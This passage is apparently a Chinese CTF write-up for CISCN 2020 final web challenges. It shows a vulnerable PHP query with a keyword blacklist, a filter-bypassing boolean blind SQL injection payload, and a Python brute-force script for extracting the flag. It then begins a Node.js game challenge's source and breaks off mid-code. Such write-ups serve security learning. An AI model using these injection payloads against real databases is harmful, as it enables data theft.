title="Web"></a>Web</h2><h3 id="Web1-ezsql"><a href="#Web1-ezsql" class="headerlink" title="Web1 ezsql"></a>Web1 ezsql</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Get The Flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--     $query = "SELECT * FROM fake_flag WHERE id = $id limit 0,$limit";    //$query = "SELECT flag FROM real_flag WHERE id = $id limit 0,$limit";--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            yourt id        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>limit<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get it<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn<span class="token punctuation">"</span></span> <span class="token attr-name">btn-info</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>是道 <strong>SQL 注入</strong>的题。根据提示真正的 flag 在 <code>real_flag</code> 这个表里，且字段名为 <code>flag</code>，需要通过 <code>id</code> 和 <code>limit</code> 这两个参数来注入。</p><p>现场试了发现一堆关键字都被过滤掉了，<code>UNION</code>、<code>SUBSTR</code> 不可行，<code>'</code> <code>"</code> <code>/**/</code> <code>()</code> 等等都被过滤掉了，只能盲注了。</p><p>然而试了很多都没被过滤了草……</p><p>最后 fix 的时候发现读取数据库相关的源码长下面这样。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">is_safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$common_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">,</span> <span class="token string">"|"</span> <span class="token punctuation">,</span><span class="token string">'between'</span><span class="token punctuation">,</span><span class="token string">'not'</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"like"</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$hack_list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'union'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'in'</span><span class="token punctuation">,</span><span class="token string">"/**/"</span><span class="token punctuation">,</span><span class="token string">"substr"</span><span class="token punctuation">,</span><span class="token string">"ascii"</span><span class="token punctuation">,</span><span class="token string">"left"</span><span class="token punctuation">,</span><span class="token string">"right"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$id_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'left'</span><span class="token punctuation">,</span><span class="token string">'right'</span><span class="token punctuation">,</span><span class="token string">'like'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$limit_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'-'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span> <span class="token punctuation">(</span><span class="token variable">$common_blacklist</span><span class="token punctuation">,</span> <span class="token variable">$hack_list</span><span class="token punctuation">,</span> <span class="token variable">$id_blacklist</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"your param &lt;b>id&lt;/b> look like dangerous!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span> <span class="token punctuation">(</span><span class="token variable">$common_blacklist</span><span class="token punctuation">,</span> <span class="token variable">$hack_list</span><span class="token punctuation">,</span> <span class="token variable">$limit_blacklist</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"your param &lt;b>limit&lt;/b> look like dangerous!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$limit</span> <span class="token operator">></span> <span class="token number">10</span> <span class="token keyword">or</span> <span class="token variable">$limit</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"your param limit can't >10 or &lt;=0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"stop , hack!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM fake_flag WHERE id = $id limit 0,$limit"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"database error, please check your input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//var_dump($result);</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">===</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"searched nothing"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>也就是说 <code>id</code> 过滤了括号，<code>limit</code> 过滤了 <code>-</code>，但可以反过来，且能用 <code>\t</code> 代替空格，用 <code>ord</code> 代替 <code>ascii</code>，就可以 <strong>布尔盲注</strong> 了。</p><p>群里大佬的 <strong>payload</strong>:</p><pre><code>id=1\tor\t{x}-/*'&amp;limit='10\tnana*/ord((select\tgroup_concat(flag)\tfrom\treal_flag))</code></pre><p>构造出来的 SQL 语句长这样。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> fake_flag <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">1</span>\tor\t{x}<span class="token operator">-</span><span class="token comment" spellcheck="true">/*' limit 0, '10\tnana*/</span>ord<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span>\tgroup_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>\tfrom\treal_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>其中，<code>ord</code>函数<strong>返回的是字符串第一个字符的 ASCII 值</strong>，<code>group_concat</code>函数<strong>返回带有来自一个组的连接的非NULL值的字符串结果</strong>，也就是把flag字段的数据（默认用 <code>,</code> ）合并起来。</p><p><code>fake_flag</code> 中有两项结果，<code>id</code> 分别对应着1和2。</p><p><strong>如果 or 后面的表达式为假，即说明 x 和 flag 中的这一位对上了，那么查询出来的结果就只有一项了。</strong></p><p>另外，发现没有拦截 <code>MID</code>，可以用这个来索引 flag。</p><p>于是进一步构造 SQL 语句：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> fake_flag <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">1</span>\tor\t{x}<span class="token operator">-</span><span class="token comment" spellcheck="true">/*' limit 0, '10\tnana*/</span>ord<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span>\tMID<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>\tfrom\treal_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>所以大概就遍历一下 x 的取值，从而把 flag 爆破出来。</p><p>比如本地试一试，比如 <code>f</code> 对应 ASCII 为 102，此时只有一个结果。</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006034849125.png" alt="sql"></p><blockquote><p>当然也可以设置 <code>id</code> 为一个不存在的值，在正常情况下查询不到结果。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> fake_flag <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">5</span>\tor\t{x}<span class="token operator">-</span><span class="token comment" spellcheck="true">/*' limit 0, '10\tnana*/</span>ord<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span>\tMID<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>\tfrom\treal_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>加入注入语句后，如果 x 和 flag 中的相应位置字符没对应上，则 or 之后的表达式结果不为0，即为真，那么查询时将有结果返回；</p><p>而字符对应上的话，表达式结果为0，or 出来结果都为假，于是就查询不到结果。</p><p>这样也能实现布尔盲注。</p></blockquote><p>参考网上jio本改了改：（大概逻辑这样，未实际测试</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringmystring <span class="token operator">=</span> string<span class="token punctuation">.</span>printable  <span class="token comment" spellcheck="true"># 所有可见字符</span>url <span class="token operator">=</span> <span class="token string">"http://URL/"</span>url <span class="token operator">+=</span> <span class="token string">"?id=5\tor\t{0}-/*'&amp;limit='10\tnana*/ord((select\tmid(group_concat(flag),{1})\tfrom\treal_flag))"</span>"reply <span class="token operator">=</span> <span class="token string">"searched nothing"</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token number">1</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    temp_result <span class="token operator">=</span> result    <span class="token keyword">for</span> char <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> reply <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            result <span class="token operator">+=</span> char            <span class="token keyword">print</span><span class="token punctuation">(</span>result <span class="token operator">+</span> <span class="token string">'......'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> result <span class="token operator">==</span> temp_result<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Complete!'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    count<span class="token operator">+=</span><span class="token number">1</span></code></pre><p><em>（害，还是太菜了，连布尔盲注都不会嘤嘤嘤</em></p><h3 id="Web2-battle"><a href="#Web2-battle" class="headerlink" title="Web2 battle"></a>Web2 battle</h3><p>是一道 Node.js 的题。</p><p><strong>部分源码：</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span>  <span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//计算纯粹伤害</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span>buff<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>aggressivity<span class="token operator">+</span>player<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> player<span class="token punctuation">.</span>aggressivity<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">triggerPassiveSkill</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//触发被动技能</span><span class="token punctuation">{</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span>career<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">"warrior"</span><span class="token punctuation">:</span>            player<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token number">5</span>            <span class="token keyword">return</span> <span class="token number">1</span>        <span class="token keyword">case</span> <span class="token string">"high_priest"</span> <span class="token punctuation">:</span>            player<span class="token punctuation">.</span>HP <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">10</span>            player<span class="token punctuation">.</span>HP <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>HP<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">2</span>        <span class="token keyword">case</span> <span class="token string">'shooter'</span> <span class="token punctuation">:</span>            player<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token number">7</span>            <span class="token keyword">return</span> <span class="token number">3</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">playerUseItem</span><span class="token punctuation">(</span>round<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//ZLYG：治疗药膏，使用后回复10点生命值</span>    <span class="token comment" spellcheck="true">//BYZF：白银之锋，使用后的一次攻击将触发暴击并造成130%的伤害</span>    <span class="token comment" spellcheck="true">//XELD：邪恶镰刀，使用后将对方的一次攻击的攻击力变为80%</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>round <span class="token operator">==</span> player<span class="token punctuation">.</span>round_to_use <span class="token operator">&amp;&amp;</span> player<span class="token punctuation">.</span>num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        player<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">"ZLYG"</span><span class="token punctuation">:</span>                player<span class="token punctuation">.</span>HP <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                <span class="token keyword">return</span>  <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"BYZF"</span><span class="token punctuation">:</span>                player<span class="token punctuation">.</span>buff <span class="token operator">=</span> player<span class="token punctuation">.</span>aggressivity <span class="token operator">*</span> <span class="token number">0.3</span><span class="token punctuation">;</span>                player<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"XELD"</span><span class="token punctuation">:</span>                monster<span class="token punctuation">.</span>buff <span class="token operator">=</span> monster<span class="token punctuation">.</span>aggressivity <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">0.8</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                monster<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>monster<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">playerAttackMonster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    monster<span class="token punctuation">.</span>HP <span class="token operator">-</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    monster<span class="token punctuation">.</span>HP <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>monster<span class="token punctuation">.</span>HP<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">monsterAttackPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>monster<span class="token punctuation">.</span>buff<span class="token punctuation">)</span> <span class="token punctuation">{</span>        player<span class="token punctuation">.</span>HP <span class="token operator">-</span><span class="token operator">=</span> <span class="token punctuation">(</span>monster<span class="token punctuation">.</span>aggressivity <span class="token operator">+</span> monster<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>        player<span class="token punctuation">.</span>HP <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>HP<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>monster<span class="token punctuation">.</span>aggressivity <span class="token operator">+</span> monster<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        player<span class="token punctuation">.</span>HP <span class="token operator">-</span><span class="token operator">=</span> monster<span class="token punctuation">.</span>aggressivity        player<span class="token punctuation">.</span>HP <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>HP<span class="token punctuation">)</span>        <span class="token keyword">return</span> monster<span class="token punctuation">.</span>aggressivity    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//......</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/start'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token operator">==</span> <span class="token string">'object'</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        player <span class="token operator">=</span> <span class="token punctuation">{</span>            name <span class="token punctuation">:</span> <span class="token string">"ciscn"</span><span class="token punctuation">,</span>            career <span class="token punctuation">:</span> <span class="token string">"warrior"</span><span class="token punctuation">,</span>            item <span class="token punctuation">:</span> <span class="token string">"BYZF"</span><span class="token punctuation">,</span>            round_to_use <span class="token punctuation">:</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">//round_to_use表示在哪一轮使用物品</span>        <span class="token punctuation">}</span>        <span class="token keyword">let</span> tempPlayer <span class="token operator">=</span> req<span class="token punctuation">.</span>body        <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">let</span> i <span class="token keyword">in</span> tempPlayer <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'career'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>careers<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'item'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>items<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'round_to_use'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">checkRound</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">continue</span>                <span class="token punctuation">}</span>                player<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        player<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//player剩余可`使用物品`的次数</span>        player<span class="token punctuation">.</span>HP <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//HP为血量</span>        player<span class="token punctuation">.</span>aggressivity <span class="token operator">=</span> <span class="token function">getPlayerAggressivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">initMonster</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/battle"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token 